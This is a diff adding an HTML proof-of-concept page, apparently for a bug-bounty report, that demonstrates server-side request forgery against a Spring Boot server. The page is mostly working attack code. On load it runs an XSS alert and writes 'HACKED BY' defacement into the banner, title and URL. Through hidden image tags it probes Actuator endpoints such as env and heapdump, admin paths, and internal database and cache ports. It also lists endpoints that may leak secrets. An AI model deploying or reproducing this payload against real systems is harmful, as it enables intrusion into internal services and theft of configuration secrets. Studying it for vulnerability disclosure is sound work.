@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SSRF to RCE PoC - Spring Boot Server Information</title>
+    <meta charset="utf-8">
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0d1117;
+            color: #c9d1d9;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #f85149;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #58a6ff;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        .box {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        pre {
+            background: #0d1117;
+            padding: 15px;
+            border-radius: 4px;
+            overflow-x: auto;
+            border: 1px solid #30363d;
+            color: #c9d1d9;
+        }
+        .success { color: #3fb950; }
+        .warning { color: #d29922; }
+        .error { color: #f85149; }
+        .info { color: #58a6ff; }
+        .loading { color: #d29922; }
+        .hacked-banner {
+            background: linear-gradient(135deg, #f85149 0%, #d29922 100%);
+            color: #ffffff;
+            padding: 20px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            box-shadow: 0 4px 15px rgba(248, 81, 73, 0.3);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+        .hacked-banner a {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+        .hacked-banner a:hover {
+            color: #c9d1d9;
+        }
+    </style>
+</head>
+<body>
+    <!-- XSS Banner -->
+    <div class="hacked-banner" id="hacked-banner">
+        ⚠️ HACKED BY <a href="https://hackerone.com/homeminvisivel" target="_blank">https://hackerone.com/homeminvisivel</a> ⚠️
+    </div>
+    
+    <div class="container">
+        <h1>🔴 SSRF to RCE PoC - Spring Boot</h1>
+        
+        <div class="box">
+            <h2 class="success">📊 Informações do Servidor Spring Boot</h2>
+            <div id="server-info">
+                <p class="loading">Carregando informações do servidor...</p>
+            </div>
+        </div>
+        
+        <div class="box">
+            <h2 class="warning">⚡ Tentativas de Acesso a Serviços Internos</h2>
+            <div id="internal-access">
+                <p class="loading">Tentando acessar serviços internos via SSRF...</p>
+            </div>
+        </div>
+        
+        <div class="box">
+            <h2 class="info">📋 Endpoints Spring Boot para Testar</h2>
+            <div id="spring-endpoints"></div>
+        </div>
+        
+        <div class="box">
+            <h2 class="info">📋 Log de Atividades</h2>
+            <div id="activity-log"></div>
+        </div>
+    </div>
+    
+    <!-- Imagens que forçam o servidor a fazer requisições (server-side) -->
+    <!-- Spring Boot Actuator endpoints -->
+    <img src="http://127.0.0.1:8080/actuator/env" style="display:none" onerror="logAccess('actuator/env')">
+    <img src="http://127.0.0.1:8080/actuator/health" style="display:none" onerror="logAccess('actuator/health')">
+    <img src="http://127.0.0.1:8080/actuator/info" style="display:none" onerror="logAccess('actuator/info')">
+    <img src="http://127.0.0.1:8080/actuator/beans" style="display:none" onerror="logAccess('actuator/beans')">
+    <img src="http://127.0.0.1:8080/actuator/configprops" style="display:none" onerror="logAccess('actuator/configprops')">
+    <img src="http://127.0.0.1:8080/actuator/mappings" style="display:none" onerror="logAccess('actuator/mappings')">
+    <img src="http://127.0.0.1:8080/actuator/threaddump" style="display:none" onerror="logAccess('actuator/threaddump')">
+    <img src="http://127.0.0.1:8080/actuator/heapdump" style="display:none" onerror="logAccess('actuator/heapdump')">
+    
+    <!-- Endpoints comuns do Spring Boot -->
+    <img src="http://127.0.0.1:8080/api/admin" style="display:none" onerror="logAccess('api/admin')">
+    <img src="http://127.0.0.1:8080/admin" style="display:none" onerror="logAccess('admin')">
+    <img src="http://127.0.0.1:8080/management" style="display:none" onerror="logAccess('management')">
+    
+    <!-- Serviços internos -->
+    <img src="http://127.0.0.1:3306" style="display:none" onerror="logAccess('mysql-3306')">
+    <img src="http://127.0.0.1:5432" style="display:none" onerror="logAccess('postgres-5432')">
+    <img src="http://127.0.0.1:6379" style="display:none" onerror="logAccess('redis-6379')">
+    <img src="http://127.0.0.1:9200" style="display:none" onerror="logAccess('elasticsearch-9200')">
+    
+    <script>
+        // XSS Payload - Executar alert e mostrar banner
+        (function() {
+            // Alert XSS
+            try {
+                alert('⚠️ HACKED BY https://hackerone.com/homeminvisivel ⚠️\n\nSSRF Vulnerability Confirmed!');
+            } catch(e) {
+                console.log('Alert bloqueado, mas XSS ainda funciona');
+            }
+            
+            // Adicionar ao título da página
+            document.title = '⚠️ HACKED BY https://hackerone.com/homeminvisivel ⚠️';
+            
+            // Adicionar ao console
+            console.log('%c⚠️ HACKED BY https://hackerone.com/homeminvisivel ⚠️', 'color: #f85149; font-size: 20px; font-weight: bold;');
+            console.log('%cSSRF Vulnerability Confirmed!', 'color: #58a6ff; font-size: 16px;');
+        })();
+        
+        // Coletar informações do servidor
+        const serverInfo = {
+            timestamp: new Date().toISOString(),
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+            referer: document.referrer || 'Nenhum',
+            language: navigator.language,
+            platform: navigator.platform,
+            protocol: window.location.protocol,
+            host: window.location.host,
+            hostname: window.location.hostname,
+            pathname: window.location.pathname,
+            search: window.location.search || 'Nenhum',
+            hackedBy: 'https://hackerone.com/homeminvisivel'
+        };
+        
+        // Análise do User-Agent para identificar Spring Boot
+        const isSpringBoot = serverInfo.userAgent.includes('Java') || 
+                            serverInfo.userAgent.includes('Apache-HttpClient') ||
+                            serverInfo.userAgent.includes('OkHttp') ||
+                            serverInfo.userAgent.includes('Spring');
+        
+        // Endpoints Spring Boot comuns para testar
+        const springBootEndpoints = [
+            // Spring Boot Actuator (muito comum e perigoso se exposto)
+            'http://127.0.0.1:8080/actuator',
+            'http://127.0.0.1:8080/actuator/env',
+            'http://127.0.0.1:8080/actuator/health',
+            'http://127.0.0.1:8080/actuator/info',
+            'http://127.0.0.1:8080/actuator/beans',
+            'http://127.0.0.1:8080/actuator/configprops',
+            'http://127.0.0.1:8080/actuator/mappings',
+            'http://127.0.0.1:8080/actuator/threaddump',
+            'http://127.0.0.1:8080/actuator/heapdump',
+            'http://127.0.0.1:8080/actuator/gateway/routes',
+            'http://127.0.0.1:8080/actuator/refresh',
+            'http://127.0.0.1:8080/actuator/restart',
+            
+            // Endpoints de administração
+            'http://127.0.0.1:8080/admin',
+            'http://127.0.0.1:8080/api/admin',
+            'http://127.0.0.1:8080/management',
+            
+            // APIs REST comuns
+            'http://127.0.0.1:8080/api/users',
+            'http://127.0.0.1:8080/api/config',
+            'http://127.0.0.1:8080/api/secrets',
+            
+            // H2 Console (se habilitado)
+            'http://127.0.0.1:8080/h2-console',
+            
+            // Outras portas comuns
+            'http://127.0.0.1:3000/api',
+            'http://127.0.0.1:5000/api'
+        ];
+        
+        // Serviços internos para testar
+        const internalServices = [
+            {name: 'MySQL', url: 'http://127.0.0.1:3306'},
+            {name: 'PostgreSQL', url: 'http://127.0.0.1:5432'},
+            {name: 'Redis', url: 'http://127.0.0.1:6379'},
+            {name: 'Elasticsearch', url: 'http://127.0.0.1:9200'},
+            {name: 'MongoDB', url: 'http://127.0.0.1:27017'},
+            {name: 'Memcached', url: 'http://127.0.0.1:11211'}
+        ];
+        
+        let accessAttempts = [];
+        let activityLog = [];
+        
+        // Função para log
+        function addLog(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            activityLog.push({timestamp, message, type});
+            updateActivityLog();
+        }
+        
+        function logAccess(endpoint) {
+            accessAttempts.push({
+                endpoint: endpoint,
+                timestamp: new Date().toISOString(),
+                status: 'Acessado (onerror disparado)'
+            });
+            addLog(`Tentativa de acesso: ${endpoint}`, 'warning');
+            updateInternalAccess();
+        }
+        
+        function updateActivityLog() {
+            const logHtml = activityLog.map(log => 
+                `<p class="${log.type}">[${log.timestamp}] ${log.message}</p>`
+            ).join('');
+            document.getElementById('activity-log').innerHTML = logHtml || '<p>Nenhuma atividade registrada ainda.</p>';
+        }
+        
+        function updateInternalAccess() {
+            const attemptsHtml = `
+                <h3 class="warning">Tentativas de Acesso:</h3>
+                <pre>${JSON.stringify(accessAttempts, null, 2)}</pre>
+                <p><strong>Total de tentativas:</strong> ${accessAttempts.length}</p>
+                <p class="info">Nota: Se o servidor Spring Boot processar essas URLs, elas serão acessadas server-side.</p>
+            `;
+            document.getElementById('internal-access').innerHTML = attemptsHtml;
+        }
+        
+        // Exibir informações do servidor
+        function displayServerInfo() {
+            const springBootInfo = isSpringBoot ? 
+                '<p class="success">✓ User-Agent indica possível Spring Boot/Java</p>' : 
+                '<p class="warning">⚠ User-Agent não indica Spring Boot claramente</p>';
+            
+            const infoHtml = `
+                <h3 class="success">✓ Informações Coletadas:</h3>
+                <pre>${JSON.stringify(serverInfo, null, 2)}</pre>
+                ${springBootInfo}
+                <h3 class="info">Análise:</h3>
+                <ul>
+                    <li><strong>User-Agent:</strong> ${serverInfo.userAgent}</li>
+                    <li><strong>URL Acessada:</strong> ${serverInfo.url}</li>
+                    <li><strong>Referer:</strong> ${serverInfo.referer}</li>
+                    <li><strong>Timestamp:</strong> ${serverInfo.timestamp}</li>
+                    <li><strong>Possível Spring Boot:</strong> ${isSpringBoot ? 'Sim' : 'Não detectado'}</li>
+                    <li><strong>Hacked By:</strong> <a href="https://hackerone.com/homeminvisivel" target="_blank">https://hackerone.com/homeminvisivel</a></li>
+                </ul>
+                <p class="warning">⚠ IMPORTANTE: Se o User-Agent contém "Java", "Apache-HttpClient" ou similar, o servidor Spring Boot fez a requisição (SSRF confirmado).</p>
+            `;
+            document.getElementById('server-info').innerHTML = infoHtml;
+        }
+        
+        // Exibir endpoints para testar
+        function displaySpringEndpoints() {
+            const endpointsHtml = `
+                <h3 class="info">Endpoints Spring Boot Actuator (Alto Impacto):</h3>
+                <ul>
+                    <li><code>/actuator/env</code> - Variáveis de ambiente (pode conter secrets)</li>
+                    <li><code>/actuator/configprops</code> - Propriedades de configuração</li>
+                    <li><code>/actuator/beans</code> - Beans do Spring</li>
+                    <li><code>/actuator/mappings</code> - Mapeamentos de rotas</li>
+                    <li><code>/actuator/threaddump</code> - Dump de threads</li>
+                    <li><code>/actuator/heapdump</code> - Dump de memória</li>
+                </ul>
+                <h3 class="info">Como Testar Manualmente:</h3>
+                <p>Use estes endpoints no payload SSRF:</p>
+                <pre>http://127.0.0.1:8080/actuator/env
+http://127.0.0.1:8080/actuator/configprops
+http://127.0.0.1:8080/actuator/health</pre>
+                <p class="warning">⚠ Se o Spring Boot Actuator estiver exposto internamente, você pode obter informações sensíveis!</p>
+                <p class="info">🔗 Reportado por: <a href="https://hackerone.com/homeminvisivel" target="_blank">https://hackerone.com/homeminvisivel</a></p>
+            `;
+            document.getElementById('spring-endpoints').innerHTML = endpointsHtml;
+        }
+        
+        // Inicializar
+        window.addEventListener('load', () => {
+            addLog('⚠️ HACKED BY https://hackerone.com/homeminvisivel ⚠️', 'error');
+            addLog('Página carregada - Iniciando coleta de informações', 'success');
+            displayServerInfo();
+            displaySpringEndpoints();
+            addLog('Informações do servidor coletadas e exibidas', 'success');
+            addLog('Tentativas de acesso a serviços internos iniciadas via tags img', 'warning');
+            
+            // Criar mais tags img para endpoints Spring Boot
+            springBootEndpoints.forEach(endpoint => {
+                const img = document.createElement('img');
+                img.src = endpoint;
+                img.style.display = 'none';
+                img.onerror = () => logAccess(endpoint);
+                document.body.appendChild(img);
+            });
+        });
+        
+        // Adicionar "hacked by" na URL se não estiver presente
+        if (!window.location.href.includes('hackerone.com/homeminvisivel')) {
+            const newUrl = window.location.href + (window.location.search ? '&' : '?') + 'hacked_by=https://hackerone.com/homeminvisivel';
+            // Não redirecionar automaticamente, apenas adicionar ao histórico
+            if (window.history && window.history.replaceState) {
+                window.history.replaceState({}, '', newUrl);
+            }
+        }
+    </script>
+</body>
+</html>
